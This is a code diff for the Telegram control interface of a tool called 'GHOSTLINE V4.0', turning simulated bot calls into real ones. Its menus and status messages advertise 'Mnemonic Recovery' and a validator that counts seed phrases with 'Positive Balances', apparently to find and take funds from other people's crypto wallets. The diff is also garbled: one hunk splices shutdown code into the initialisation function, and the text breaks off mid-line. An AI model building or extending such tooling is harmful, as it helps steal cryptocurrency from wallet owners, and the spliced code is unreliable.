@@ -1,6 +1,8 @@
-// Telegram Interface V4.0 - Enhanced Security & Error Handling
+// // Telegram Interface V4.0 - Real API Implementation
 // File: modules/TelegramInterface.js
+
 const TelegramBot = require('node-telegram-bot-api');
+
 class TelegramInterface {
     constructor(system) {
         this.system = system;
@@ -29,18 +31,18 @@ class TelegramInterface {
         
         // Message templates
         this.templates = {
-            unauthorized: '[🚫] Unauthorized access detected',
-            error: '[❌] Command failed: {error}',
-            success: '[✅] {message}',
-            warning: '[⚠️] {message}',
-            info: '[ℹ️] {message}'
+            unauthorized: '🚫 Unauthorized access detected',
+            error: '❌ Command failed: {error}',
+            success: '✅ {message}',
+            warning: '⚠️ {message}',
+            info: 'ℹ️ {message}'
         };
         
         // Setup handlers
         this.setupCommands();
         this.setupCallbacks();
         
-        this.logger.info('[◉] TelegramInterface V4.0 initialized with security');
+        this.logger.info('[◉] TelegramInterface V4.0 initialized');
     }
 
     async initialize() {
@@ -53,7 +55,195 @@ class TelegramInterface {
             }
             
             this.logger.success('[✓] Telegram interface initialized');
-            return { success: true, message: 'Telegram interface ready' };
+            return { success: true, message: 'Telegram interface stopped' };
+        } catch (error) {
+            this.logger.error(`[✗] Telegram stop failed: ${error.message}`);
+            return { success: false, message: error.message };
+        }
+    }
+
+    // Helper methods for other modules to use
+    async showControlMenu(query) {
+        const message = this.createControlMessage();
+        const keyboard = this.createControlKeyboard();
+        
+        if (query.message) {
+            await this.editMessage(query.message.chat.id, query.message.message_id, message, keyboard);
+        } else {
+            await this.sendMessage(this.chatId, message, { 
+                reply_markup: { inline_keyboard: keyboard },
+                parse_mode: 'HTML'
+            });
+        }
+    }
+
+    createControlMessage() {
+        return `<b>🎛️ SYSTEM CONTROL PANEL</b>\n\n` +
+            `<b>Module Controls:</b>\n` +
+            `🌾 Harvester - Multi-platform task execution\n` +
+            `🔍 Analyzer - Blockchain wallet analysis\n` +
+            `💎 Validator - Mnemonic phrase validation\n\n` +
+            `<b>Quick Actions:</b>\n` +
+            `▸ Start/Stop individual modules\n` +
+            `◉ View detailed module status\n` +
+            `◯ Emergency stop all operations\n\n` +
+            `<i>Select a module to control:</i>`;
+    }
+
+    createControlKeyboard() {
+        const status = this.system.getSystemStatus();
+        
+        return [
+            [
+                { 
+                    text: status.modules?.harvester?.status?.includes('Active') ? '◯ Stop Harvester' : '▸ Start Harvester', 
+                    callback_data: status.modules?.harvester?.status?.includes('Active') ? 'harvester_stop' : 'harvester_start'
+                }
+            ],
+            [
+                { 
+                    text: status.modules?.analyzer?.status?.includes('Active') ? '◯ Stop Analyzer' : '▸ Start Analyzer', 
+                    callback_data: status.modules?.analyzer?.status?.includes('Active') ? 'analyzer_stop' : 'analyzer_start'
+                }
+            ],
+            [
+                { 
+                    text: status.modules?.validator?.status?.includes('Active') ? '◯ Stop Validator' : '▸ Start Validator', 
+                    callback_data: status.modules?.validator?.status?.includes('Active') ? 'validator_stop' : 'validator_start'
+                }
+            ],
+            [
+                { text: '📊 Status', callback_data: 'status_menu' },
+                { text: '🏠 Main Menu', callback_data: 'main_menu' }
+            ]
+        ];
+    }
+
+    async showMetricsMenu(query) {
+        try {
+            const metrics = this.system.getDetailedMetrics();
+            const message = this.formatMetricsMessage(metrics);
+            const keyboard = this.createMetricsKeyboard();
+            
+            if (query.message) {
+                await this.editMessage(query.message.chat.id, query.message.message_id, message, keyboard);
+            } else {
+                await this.sendMessage(this.chatId, message, { 
+                    reply_markup: { inline_keyboard: keyboard },
+                    parse_mode: 'HTML'
+                });
+            }
+        } catch (error) {
+            const errorMsg = `❌ Error retrieving metrics: ${error.message}`;
+            if (query.message) {
+                await this.sendMessage(query.message.chat.id, errorMsg);
+            } else {
+                await this.sendMessage(this.chatId, errorMsg);
+            }
+        }
+    }
+
+    formatMetricsMessage(metrics) {
+        return `<b>📊 PERFORMANCE METRICS</b>\n\n` +
+            `<b>System Performance:</b>\n` +
+            `▸ Uptime: ${metrics.system?.uptime || 'N/A'}\n` +
+            `◉ Active Modules: ${metrics.system?.activeModules || 0}\n` +
+            `₿ Total Earnings: ${(metrics.performance?.totalEarnings || 0).toFixed(4)} ETH\n` +
+            `▸ Tasks/Hour: ${metrics.performance?.tasksPerHour || '0.0'}\n` +
+            `↗ Hourly Earnings: ${metrics.performance?.hourlyEarnings || '0.0000'} ETH\n` +
+            `✓ Success Rate: ${metrics.performance?.successRate || '0%'}\n\n` +
+            `<b>Harvester Metrics:</b>\n` +
+            `✓ Tasks Completed: ${metrics.harvester?.tasksCompleted || 0}\n` +
+            `₿ Success Rate: ${metrics.harvester?.successRate || '0%'}\n` +
+            `▸ Avg Reward: ${metrics.harvester?.avgTaskReward || '0.0000'} ETH\n\n` +
+            `<b>Analyzer Metrics:</b>\n` +
+            `🔍 Wallets Analyzed: ${metrics.analyzer?.walletsAnalyzed || 0}\n` +
+            `✓ Discovery Rate: ${metrics.analyzer?.discoveryRate || '0%'}\n` +
+            `₿ Avg Value Found: ${metrics.analyzer?.avgValuePerWallet || '0.0000'} ETH\n\n` +
+            `<b>Security Score: ${metrics.security?.securityLevel || 'N/A'}/100</b>\n\n` +
+            `<i>Real-time data • Updated: ${new Date().toLocaleTimeString()}</i>`;
+    }
+
+    createMetricsKeyboard() {
+        return [
+            [
+                { text: '🔄 Refresh Metrics', callback_data: 'metrics_menu' },
+                { text: '📊 Status', callback_data: 'status_menu' }
+            ],
+            [
+                { text: '🎛️ Control Panel', callback_data: 'control_menu' },
+                { text: '🏠 Main Menu', callback_data: 'main_menu' }
+            ]
+        ];
+    }
+
+    async refreshStatus(query) {
+        await this.showStatusMenu(query);
+    }
+
+    async getSecurityReport(query) {
+        await this.showSecurityMenu(query);
+    }
+
+    // Placeholder methods for other modules
+    async startAnalyzer(query) {
+        try {
+            const result = await this.system.executeCommand('start_analyzer');
+            const message = result.success ? 
+                this.templates.success.replace('{message}', result.message) :
+                this.templates.error.replace('{error}', result.message);
+            
+            await this.sendNotification(message);
+            await this.showControlMenu(query);
+        } catch (error) {
+            await this.sendNotification(this.templates.error.replace('{error}', error.message));
+        }
+    }
+
+    async stopAnalyzer(query) {
+        try {
+            const result = await this.system.executeCommand('stop_analyzer');
+            const message = result.success ? 
+                this.templates.success.replace('{message}', result.message) :
+                this.templates.error.replace('{error}', result.message);
+            
+            await this.sendNotification(message);
+            await this.showControlMenu(query);
+        } catch (error) {
+            await this.sendNotification(this.templates.error.replace('{error}', error.message));
+        }
+    }
+
+    async startValidator(query) {
+        try {
+            const result = await this.system.executeCommand('start_validator');
+            const message = result.success ? 
+                this.templates.success.replace('{message}', result.message) :
+                this.templates.error.replace('{error}', result.message);
+            
+            await this.sendNotification(message);
+            await this.showControlMenu(query);
+        } catch (error) {
+            await this.sendNotification(this.templates.error.replace('{error}', error.message));
+        }
+    }
+
+    async stopValidator(query) {
+        try {
+            const result = await this.system.executeCommand('stop_validator');
+            const message = result.success ? 
+                this.templates.success.replace('{message}', result.message) :
+                this.templates.error.replace('{error}', result.message);
+            
+            await this.sendNotification(message);
+            await this.showControlMenu(query);
+        } catch (error) {
+            await this.sendNotification(this.templates.error.replace('{error}', error.message));
+        }
+    }
+}
+
+module.exports = TelegramInterface; interface ready' };
             
         } catch (error) {
             this.logger.error(`[✗] Telegram initialization failed: ${error.message}`);
@@ -74,7 +264,7 @@ class TelegramInterface {
             this.logger.warn('[--] TELEGRAM_CHAT_ID not configured - will accept first message');
         }
         
-        // Validate token format using SecurityManager
+        // Validate token format
         if (!this.security.validateTelegramToken(token)) {
             this.logger.error('[✗] Invalid Telegram bot token format');
             return false;
@@ -92,24 +282,34 @@ class TelegramInterface {
             const botToken = this.config.get('TELEGRAM_BOT_TOKEN');
             this.chatId = this.config.get('TELEGRAM_CHAT_ID');
             
-            // For production, you would use actual Telegram Bot API
-            // Here we simulate the connection
-            const TelegramBot = require('node-telegram-bot-api');
-this.bot = new TelegramBot(botToken, { polling: true });
+            // Create real Telegram bot instance
+            this.bot = new TelegramBot(botToken, { 
+                polling: {
+                    interval: 1000,
+                    autoStart: true,
+                    params: {
+                        timeout: 10
+                    }
+                }
+            });
             
             this.setupEventHandlers();
             this.startRateLimitManager();
             
+            // Test bot connection
+            const botInfo = await this.bot.getMe();
+            this.logger.success(`[✓] Connected to bot: ${botInfo.first_name} (@${botInfo.username})`);
+            
             this.isConnected = true;
-            this.logger.success('[✓] Telegram bot connected successfully');
             
             // Log security event
             await this.logger.logSecurity('telegram_connected', {
-                botToken: this.security.hashForLogging(botToken),
+                botName: botInfo.first_name,
+                botUsername: botInfo.username,
                 chatId: this.chatId ? this.security.hashForLogging(this.chatId) : null
             });
             
-            return { success: true, message: 'Telegram interface started' };
+            return { success: true, message: 'Telegram interface started successfully' };
             
         } catch (error) {
             this.logger.error(`[✗] Telegram connection failed: ${error.message}`);
@@ -118,13 +318,31 @@ this.bot = new TelegramBot(botToken, { polling: true });
     }
 
     setupEventHandlers() {
-        // Simulate message handling
-        this.logger.debug('[◎] Event handlers configured');
+        // Handle messages
+        this.bot.on('message', (msg) => {
+            this.handleMessage(msg).catch(error => {
+                this.logger.error(`[✗] Message handling error: ${error.message}`);
+            });
+        });
         
-        // In a real implementation, you would set up:
-        // this.bot.on('message', (msg) => this.handleMessage(msg));
-        // this.bot.on('callback_query', (query) => this.handleCallback(query));
-        // this.bot.on('error', (error) => this.handleError(error));
+        // Handle callback queries (inline buttons)
+        this.bot.on('callback_query', (query) => {
+            this.handleCallback(query).catch(error => {
+                this.logger.error(`[✗] Callback handling error: ${error.message}`);
+            });
+        });
+        
+        // Handle errors
+        this.bot.on('error', (error) => {
+            this.logger.error(`[✗] Telegram bot error: ${error.message}`);
+        });
+        
+        // Handle polling errors
+        this.bot.on('polling_error', (error) => {
+            this.logger.error(`[✗] Telegram polling error: ${error.message}`);
+        });
+        
+        this.logger.debug('[◎] Real Telegram event handlers configured');
     }
 
     startRateLimitManager() {
@@ -144,7 +362,7 @@ this.bot = new TelegramBot(botToken, { polling: true });
     async processQueuedMessages() {
         while (this.rateLimitQueue.length > 0 && this.canSendMessage()) {
             const queuedMessage = this.rateLimitQueue.shift();
-            await this.sendMessageNow(queuedMessage.text, queuedMessage.options);
+            await this.sendMessageNow(queuedMessage.chatId, queuedMessage.text, queuedMessage.options);
         }
     }
 
@@ -195,7 +413,10 @@ this.bot = new TelegramBot(botToken, { polling: true });
             if (!this.chatId) {
                 this.chatId = chatId.toString();
                 this.config.set('TELEGRAM_CHAT_ID', this.chatId);
-                this.logger.security('new_chat_registered', { chatId: this.security.hashForLogging(this.chatId) });
+                this.logger.security('new_chat_registered', { 
+                    chatId: this.security.hashForLogging(this.chatId),
+                    username: msg.from.username || 'unknown'
+                });
             }
             
             // Security: Validate authorized user
@@ -207,14 +428,14 @@ this.bot = new TelegramBot(botToken, { polling: true });
             this.logger.info(`[▸] Received command: ${text}`);
             
             // Handle commands
-            if (text.startsWith('/')) {
+            if (text && text.startsWith('/')) {
                 const command = text.split(' ')[0];
                 const handler = this.commandHandlers.get(command);
                 
                 if (handler) {
                     await handler(msg);
                 } else {
-                    await this.sendMessage(this.templates.error.replace('{error}', `Unknown command: ${command}`));
+                    await this.sendMessage(chatId, this.templates.error.replace('{error}', `Unknown command: ${command}`));
                 }
             } else {
                 await this.handleRegularMessage(msg);
@@ -222,7 +443,30 @@ this.bot = new TelegramBot(botToken, { polling: true });
             
         } catch (error) {
             this.logger.error(`[✗] Message handling error: ${error.message}`);
-            await this.sendMessage(this.templates.error.replace('{error}', 'Internal error occurred'));
+            await this.sendMessage(msg.chat.id, this.templates.error.replace('{error}', 'Internal error occurred'));
+        }
+    }
+
+    async handleCallback(query) {
+        try {
+            const callbackData = query.data;
+            const handler = this.callbackHandlers.get(callbackData);
+            
+            if (handler) {
+                await handler(query);
+                await this.bot.answerCallbackQuery(query.id);
+            } else {
+                await this.bot.answerCallbackQuery(query.id, {
+                    text: 'Unknown action',
+                    show_alert: false
+                });
+            }
+        } catch (error) {
+            this.logger.error(`[✗] Callback handling error: ${error.message}`);
+            await this.bot.answerCallbackQuery(query.id, {
+                text: 'Error processing request',
+                show_alert: true
+            });
         }
     }
 
@@ -237,14 +481,14 @@ this.bot = new TelegramBot(botToken, { polling: true });
         
         // Send warning to unauthorized user
         try {
-            await this.sendMessageToChat(chatId, this.templates.unauthorized);
+            await this.sendMessage(chatId, this.templates.unauthorized);
         } catch (error) {
             this.logger.error(`[✗] Failed to send unauthorized message: ${error.message}`);
         }
         
         // Notify authorized user if connected
         if (this.isConnected && this.chatId) {
-            await this.sendMessage(`🚨 SECURITY ALERT: Unauthorized access attempt\nUser: ${userId}\nCommand: ${text}`);
+            await this.sendMessage(this.chatId, `🚨 SECURITY ALERT: Unauthorized access attempt\nUser: ${userId}\nCommand: ${text}`);
         }
     }
 
@@ -252,7 +496,10 @@ this.bot = new TelegramBot(botToken, { polling: true });
         const welcomeMessage = this.createWelcomeMessage();
         const keyboard = this.createMainMenuKeyboard();
         
-        await this.sendMessage(welcomeMessage, { reply_markup: { inline_keyboard: keyboard } });
+        await this.sendMessage(msg.chat.id, welcomeMessage, {
+            reply_markup: { inline_keyboard: keyboard },
+            parse_mode: 'HTML'
+        });
     }
 
     async handleMenu(msg) {
@@ -273,13 +520,12 @@ this.bot = new TelegramBot(botToken, { polling: true });
 
     async handleHelp(msg) {
         const helpMessage = this.createHelpMessage();
-        await this.sendMessage(helpMessage);
+        await this.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'HTML' });
     }
 
     async handleEmergency(msg) {
-        // Additional security confirmation for emergency commands
         const confirmationId = this.security.generateSecureId();
-        await this.sendMessage(
+        await this.sendMessage(msg.chat.id,
             `⚠️ EMERGENCY STOP CONFIRMATION\n\n` +
             `This will stop ALL system operations.\n` +
             `Type: /confirm ${confirmationId.substring(0, 8)} to proceed`
@@ -306,33 +552,50 @@ this.bot = new TelegramBot(botToken, { polling: true });
                     `📅 Oldest Log: ${logStats.oldestLog ? new Date(logStats.oldestLog).toLocaleDateString() : 'N/A'}\n` +
                     `🕐 Newest Log: ${logStats.newestLog ? new Date(logStats.newestLog).toLocaleDateString() : 'N/A'}`;
                 
-                await this.sendMessage(message);
+                await this.sendMessage(msg.chat.id, message);
             } else {
-                await this.sendMessage('❌ Unable to retrieve log statistics');
+                await this.sendMessage(msg.chat.id, '❌ Unable to retrieve log statistics');
             }
         } catch (error) {
-            await this.sendMessage(`❌ Error retrieving logs: ${error.message}`);
+            await this.sendMessage(msg.chat.id, `❌ Error retrieving logs: ${error.message}`);
+        }
+    }
+
+    async handleRegularMessage(msg) {
+        const text = msg.text.toLowerCase();
+        
+        if (text.includes('status')) {
+            await this.handleStatus(msg);
+        } else if (text.includes('help')) {
+            await this.handleHelp(msg);
+        } else {
+            await this.sendMessage(msg.chat.id, 
+                '💡 Use /menu for navigation or try these commands:\n' +
+                '/start - Main menu\n' +
+                '/status - System status\n' +
+                '/help - Command help'
+            );
         }
     }
 
     createWelcomeMessage() {
         const status = this.system.isInitialized ? '🟢 Online' : '🟡 Starting';
         
-        return `🤖 GHOSTLINE V4.0 CONTROL CENTER\n\n` +
-            `🚀 Advanced Revenue Generation Platform\n\n` +
-            `💰 Active Revenue Streams:\n` +
+        return `<b>🤖 GHOSTLINE V4.0 CONTROL CENTER</b>\n\n` +
+            `🚀 <b>Advanced Revenue Generation Platform</b>\n\n` +
+            `💰 <b>Active Revenue Streams:</b>\n` +
             `   ▸ Multi-platform Task Harvesting\n` +
             `   ▸ Advanced Blockchain Analysis\n` +
             `   ▸ Mnemonic Recovery System\n\n` +
-            `🔧 Enhanced Features:\n` +
+            `🔧 <b>Enhanced Features:</b>\n` +
             `   ✅ Secure Credential Storage\n` +
             `   ✅ Real-time Performance Monitoring\n` +
             `   ✅ Smart Notification System\n` +
             `   ✅ Advanced Security Protection\n\n` +
-            `📊 System Status: ${status}\n` +
-            `🏷️ Version: ${this.system.version}\n` +
-            `🔒 Security: Enhanced Protection Active\n\n` +
-            `Use the menu below for full system control`;
+            `📊 <b>System Status:</b> ${status}\n` +
+            `🏷️ <b>Version:</b> ${this.system.version}\n` +
+            `🔒 <b>Security:</b> Enhanced Protection Active\n\n` +
+            `<i>Use the menu below for full system control</i>`;
     }
 
     createMainMenuKeyboard() {
@@ -352,8 +615,8 @@ this.bot = new TelegramBot(botToken, { polling: true });
     }
 
     createHelpMessage() {
-        return `🆘 GHOSTLINE V4.0 HELP\n\n` +
-            `🎯 Quick Commands:\n` +
+        return `<b>🆘 GHOSTLINE V4.0 HELP</b>\n\n` +
+            `<b>🎯 Quick Commands:</b>\n` +
             `/start - Show main control panel\n` +
             `/menu - Access navigation menu\n` +
             `/status - View system status\n` +
@@ -362,17 +625,17 @@ this.bot = new TelegramBot(botToken, { polling: true });
             `/logs - View log statistics\n` +
             `/emergency - Emergency stop (requires confirmation)\n` +
             `/help - Show this help message\n\n` +
-            `🎛️ Navigation:\n` +
+            `<b>🎛️ Navigation:</b>\n` +
             `✅ Use inline buttons for easy navigation\n` +
             `🔄 Real-time status updates\n` +
             `👆 One-click module control\n` +
             `💰 Live earnings tracking\n\n` +
-            `🔒 Security Features:\n` +
+            `<b>🔒 Security Features:</b>\n` +
             `✅ Secure credential storage\n` +
             `✅ Unauthorized access protection\n` +
             `✅ Activity monitoring\n` +
             `✅ Emergency stop protection\n\n` +
-            `⚡ All operations are logged and secured`;
+            `<b>⚡ All operations are logged and secured</b>`;
     }
 
     async showMainMenu(query) {
@@ -380,9 +643,12 @@ this.bot = new TelegramBot(botToken, { polling: true });
         const keyboard = this.createMainMenuKeyboard();
         
         if (query.message) {
-            await this.editMessage(query.message.message_id, message, keyboard);
+            await this.editMessage(query.message.chat.id, query.message.message_id, message, keyboard);
         } else {
-            await this.sendMessage(message, { reply_markup: { inline_keyboard: keyboard } });
+            await this.sendMessage(this.chatId, message, { 
+                reply_markup: { inline_keyboard: keyboard },
+                parse_mode: 'HTML'
+            });
         }
     }
 
@@ -393,36 +659,44 @@ this.bot = new TelegramBot(botToken, { polling: true });
             const keyboard = this.createStatusKeyboard();
             
             if (query.message) {
-                await this.editMessage(query.message.message_id, message, keyboard);
+                await this.editMessage(query.message.chat.id, query.message.message_id, message, keyboard);
             } else {
-                await this.sendMessage(message, { reply_markup: { inline_keyboard: keyboard } });
+                await this.sendMessage(this.chatId, message, { 
+                    reply_markup: { inline_keyboard: keyboard },
+                    parse_mode: 'HTML'
+                });
             }
         } catch (error) {
-            await this.sendMessage(`❌ Error retrieving status: ${error.message}`);
+            const errorMsg = `❌ Error retrieving status: ${error.message}`;
+            if (query.message) {
+                await this.sendMessage(query.message.chat.id, errorMsg);
+            } else {
+                await this.sendMessage(this.chatId, errorMsg);
+            }
         }
     }
 
     formatStatusMessage(status) {
-        return `📊 SYSTEM STATUS REPORT\n\n` +
-            `⏱️ Runtime: ${status.runtime}\n` +
-            `🟢 Status: ${status.status}\n` +
-            `🏷️ Version: ${status.version}\n` +
-            `🔒 Security: ${status.security.status} (${status.security.events} events)\n\n` +
-            `🌾 HARVESTER MODULE\n` +
-            `${status.modules.harvester.status}\n` +
-            `📋 Active Tasks: ${status.modules.harvester.tasks || 0}\n` +
-            `💰 Pending: ${(status.modules.harvester.earnings || 0).toFixed(4)} ETH\n\n` +
-            `🔍 ANALYZER MODULE\n` +
-            `${status.modules.analyzer.status}\n` +
-            `👛 Wallets Analyzed: ${status.modules.analyzer.wallets || 0}\n` +
-            `✨ Discoveries: ${status.modules.analyzer.discoveries || 0}\n\n` +
-            `💎 VALIDATOR MODULE\n` +
-            `${status.modules.validator.status}\n` +
-            `✅ Validated: ${status.modules.validator.validated || 0}\n` +
-            `💰 Positive Balances: ${status.modules.validator.found || 0}\n\n` +
-            `🤖 TELEGRAM MODULE\n` +
-            `${status.modules.telegram.status}\n\n` +
-            `🕐 Last Updated: ${new Date().toLocaleTimeString()}`;
+        return `<b>📊 SYSTEM STATUS REPORT</b>\n\n` +
+            `⏱️ <b>Runtime:</b> ${status.runtime}\n` +
+            `🟢 <b>Status:</b> ${status.status}\n` +
+            `🏷️ <b>Version:</b> ${status.version}\n` +
+            `🔒 <b>Security:</b> ${status.security?.status || 'Active'} (${status.security?.events || 0} events)\n\n` +
+            `<b>🌾 HARVESTER MODULE</b>\n` +
+            `${status.modules?.harvester?.status || '[○] Not Available'}\n` +
+            `📋 Active Tasks: ${status.modules?.harvester?.tasks || 0}\n` +
+            `💰 Pending: ${(status.modules?.harvester?.earnings || 0).toFixed(4)} ETH\n\n` +
+            `<b>🔍 ANALYZER MODULE</b>\n` +
+            `${status.modules?.analyzer?.status || '[○] Not Available'}\n` +
+            `👛 Wallets Analyzed: ${status.modules?.analyzer?.wallets || 0}\n` +
+            `✨ Discoveries: ${status.modules?.analyzer?.discoveries || 0}\n\n` +
+            `<b>💎 VALIDATOR MODULE</b>\n` +
+            `${status.modules?.validator?.status || '[○] Not Available'}\n` +
+            `✅ Validated: ${status.modules?.validator?.validated || 0}\n` +
+            `💰 Positive Balances: ${status.modules?.validator?.found || 0}\n\n` +
+            `<b>🤖 TELEGRAM MODULE</b>\n` +
+            `${status.modules?.telegram?.status || '[○] Not Available'}\n\n` +
+            `<i>🕐 Last Updated: ${new Date().toLocaleTimeString()}</i>`;
     }
 
     createStatusKeyboard() {
@@ -445,12 +719,20 @@ this.bot = new TelegramBot(botToken, { polling: true });
             const keyboard = this.createSecurityKeyboard();
             
             if (query.message) {
-                await this.editMessage(query.message.message_id, message, keyboard);
+                await this.editMessage(query.message.chat.id, query.message.message_id, message, keyboard);
             } else {
-                await this.sendMessage(message, { reply_markup: { inline_keyboard: keyboard } });
+                await this.sendMessage(this.chatId, message, { 
+                    reply_markup: { inline_keyboard: keyboard },
+                    parse_mode: 'HTML'
+                });
             }
         } catch (error) {
-            await this.sendMessage(`❌ Error retrieving security report: ${error.message}`);
+            const errorMsg = `❌ Error retrieving security report: ${error.message}`;
+            if (query.message) {
+                await this.sendMessage(query.message.chat.id, errorMsg);
+            } else {
+                await this.sendMessage(this.chatId, errorMsg);
+            }
         }
     }
 
@@ -464,20 +746,20 @@ this.bot = new TelegramBot(botToken, { polling: true });
             'critical': '🚨'
         };
         
-        return `🔒 SECURITY DASHBOARD\n\n` +
-            `${levelEmoji[level]} Security Level: ${level.toUpperCase()}\n\n` +
-            `📊 Security Summary:\n` +
+        return `<b>🔒 SECURITY DASHBOARD</b>\n\n` +
+            `${levelEmoji[level]} <b>Security Level: ${level.toUpperCase()}</b>\n\n` +
+            `<b>📊 Security Summary:</b>\n` +
             `🚨 Total Violations: ${report.summary.totalSecurityViolations}\n` +
             `🔐 Encryption Ops: ${report.summary.encryptionOperations}\n` +
             `🔓 Decryption Ops: ${report.summary.decryptionOperations}\n` +
             `🔄 Key Rotations: ${report.summary.keyRotations}\n` +
             `🕐 Last Rotation: ${report.summary.lastKeyRotation ? new Date(report.summary.lastKeyRotation).toLocaleDateString() : 'Never'}\n\n` +
-            `⚠️ Security Alerts:\n` +
+            `<b>⚠️ Security Alerts:</b>\n` +
             `🔺 High Priority: ${report.alerts.highSeverityEvents}\n` +
             `📝 Recent Activities: ${report.alerts.recentSuspiciousActivities.length}\n\n` +
-            `💡 Recommendations: ${report.recommendations.length}\n` +
+            `<b>💡 Recommendations: ${report.recommendations.length}</b>\n` +
             report.recommendations.slice(0, 3).map(rec => `• ${rec}`).join('\n') +
-            `\n\n🕐 Report Generated: ${new Date().toLocaleTimeString()}`;
+            `\n\n<i>🕐 Report Generated: ${new Date().toLocaleTimeString()}</i>`;
     }
 
     createSecurityKeyboard() {
@@ -532,37 +814,44 @@ this.bot = new TelegramBot(botToken, { polling: true });
         }
     }
 
-    async sendMessage(text, options = {}) {
-        if (!this.isConnected || !this.chatId) {
-            this.logger.warn('[--] Cannot send message: not connected or no chat ID');
+    async sendMessage(chatId, text, options = {}) {
+        if (!this.isConnected || !this.bot) {
+            this.logger.warn('[--] Cannot send message: bot not connected');
+            return false;
+        }
+        
+        // Use provided chatId or default to stored chatId
+        const targetChatId = chatId || this.chatId;
+        if (!targetChatId) {
+            this.logger.warn('[--] Cannot send message: no chat ID available');
             return false;
         }
         
         // Check rate limit
         if (!this.canSendMessage()) {
-            this.rateLimitQueue.push({ text, options });
+            this.rateLimitQueue.push({ chatId: targetChatId, text, options });
             this.logger.debug('[◎] Message queued due to rate limit');
             return false;
         }
         
-        return await this.sendMessageNow(text, options);
+        return await this.sendMessageNow(targetChatId, text, options);
     }
 
-    async sendMessageNow(text, options = {}) {
+    async sendMessageNow(chatId, text, options = {}) {
         try {
             this.messageRate.messageCount++;
             
             // Sanitize message content
             const sanitizedText = this.logger.sanitizeMessage(text);
             
-            // In a real implementation, you would use:
-            // await this.bot.sendMessage(this.chatId, sanitizedText, options);
+            // Send message via real Telegram API
+            const sentMessage = await this.bot.sendMessage(chatId, sanitizedText, options);
             
-            // Simulate message sending
             this.logger.debug(`[▸] Telegram message sent: ${sanitizedText.substring(0, 50)}...`);
             
             // Store in message history
             this.messageHistory.push({
+                messageId: sentMessage.message_id,
                 text: sanitizedText,
                 timestamp: new Date().toISOString(),
                 options: options
@@ -580,90 +869,56 @@ this.bot = new TelegramBot(botToken, { polling: true });
         }
     }
 
-    async sendMessageToChat(chatId, text, options = {}) {
-        try {
-            // For sending to specific chat (like unauthorized access warnings)
-            const sanitizedText = this.logger.sanitizeMessage(text);
-            this.logger.debug(`[▸] Message sent to chat ${this.security.hashForLogging(chatId.toString())}`);
-            return true;
-        } catch (error) {
-            this.logger.error(`[✗] Failed to send message to chat: ${error.message}`);
-            return false;
-        }
-    }
-
-    async editMessage(messageId, text, keyboard = null) {
+    async editMessage(chatId, messageId, text, keyboard = null) {
         try {
             const sanitizedText = this.logger.sanitizeMessage(text);
-            // In real implementation: await this.bot.editMessageText(sanitizedText, { chat_id: this.chatId, message_id: messageId, reply_markup: keyboard });
+            const options = { 
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'HTML'
+            };
+            
+            if (keyboard) {
+                options.reply_markup = { inline_keyboard: keyboard };
+            }
+            
+            await this.bot.editMessageText(sanitizedText, options);
             this.logger.debug(`[▸] Message edited: ${messageId}`);
             return true;
         } catch (error) {
             // If edit fails, send new message
-            await this.sendMessage(text, keyboard ? { reply_markup: { inline_keyboard: keyboard } } : {});
+            this.logger.debug(`[--] Edit failed, sending new message: ${error.message}`);
+            await this.sendMessage(chatId, text, keyboard ? { reply_markup: { inline_keyboard: keyboard } } : {});
             return false;
         }
     }
 
     async sendNotification(text) {
-        await this.sendMessage(`📢 ${text}`);
+        await this.sendMessage(this.chatId, `📢 ${text}`);
     }
 
     async sendSystemMessage(text) {
-        await this.sendMessage(`🤖 ${text}`);
+        await this.sendMessage(this.chatId, `🤖 ${text}`);
     }
 
     async sendAlert(text) {
-        await this.sendMessage(`🚨 ALERT: ${text}`);
+        await this.sendMessage(this.chatId, `🚨 ALERT: ${text}`);
     }
 
     async sendSuccess(text) {
-        await this.sendMessage(`✅ ${text}`);
+        await this.sendMessage(this.chatId, `✅ ${text}`);
     }
 
     async stop() {
         try {
             if (this.bot) {
-                // In real implementation: await this.bot.stopPolling();
+                await this.bot.stopPolling();
                 this.isConnected = false;
                 this.logger.success('[◯] Telegram interface stopped');
                 
                 // Log security event
                 await this.logger.logSecurity('telegram_disconnected', {
-                    uptime: Date.now() - this.bot.startTime.getTime()
+                    uptime: this.bot.startTime ? Date.now() - this.bot.startTime.getTime() : 0
                 });
             }
-            return { success: true, message: 'Telegram interface stopped' };
-        } catch (error) {
-            this.logger.error(`[✗] Telegram stop failed: ${error.message}`);
-            return { success: false, message: error.message };
-        }
-    }
-
-    // Additional helper methods for other modules to use
-    async showControlMenu(query) {
-        // Implementation would show control menu
-        await this.sendMessage('🎛️ Control menu would be displayed here');
-    }
-
-    async showMetricsMenu(query) {
-        // Implementation would show metrics
-        await this.sendMessage('📈 Metrics menu would be displayed here');
-    }
-
-    async refreshStatus(query) {
-        await this.showStatusMenu(query);
-    }
-
-    async getSecurityReport(query) {
-        await this.showSecurityMenu(query);
-    }
-
-    // Placeholder methods for other modules
-    async startAnalyzer(query) { await this.sendMessage('🔍 Analyzer control not implemented yet'); }
-    async stopAnalyzer(query) { await this.sendMessage('🔍 Analyzer control not implemented yet'); }
-    async startValidator(query) { await this.sendMessage('💎 Validator control not implemented yet'); }
-    async stopValidator(query) { await this.sendMessage('💎 Validator control not implemented yet'); }
-}
-
-module.exports = TelegramInterface;
+            return { success: true, message: 'Telegram
